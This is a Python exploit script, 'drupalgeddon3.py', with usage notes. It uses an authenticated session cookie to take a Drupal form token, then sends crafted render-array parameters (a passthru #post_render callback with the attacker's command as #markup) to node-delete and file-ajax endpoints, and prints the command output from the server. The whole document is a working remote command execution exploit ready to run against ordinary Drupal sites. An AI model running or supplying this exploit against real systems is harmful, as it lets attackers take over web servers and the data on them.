#!/usr/bin/python

'''
Author: Oways
https://twitter.com/0w4ys
https://github.com/oways

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ 'SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0' 6 'uname -a'

'''
import requests
import re, sys

try:
  host=sys.argv[1]
  session={'cookie': sys.argv[2]}
  node=sys.argv[3]
  command=sys.argv[4]

  r = requests.get('%s/node/%s/delete'%(host,node),headers=session, verify=False)
  csrf = re.search(r'>\n<input type="hidden" name="form_token" value="([^"]+)" />', r.text )
  if csrf:
    data = {'form_id':'node_delete_confirm', '_triggering_element_name':'form_id','form_token':csrf.group(1)}
    r = requests.post(host+'/?q=node/'+node+'/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]='+command, data=data, headers=session)
    formid = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
    if formid:
        post_params = {'form_build_id':formid.group(1)}
        r = requests.post(host+'/?q=file/ajax/actions/cancel/%23options/path/'+formid.group(1), data=post_params, headers=session)
        print(r.text.split('[', 1)[0])
except:
  print('\n[Usage]\npython drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]\n\n[Example]\npython drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"\n')
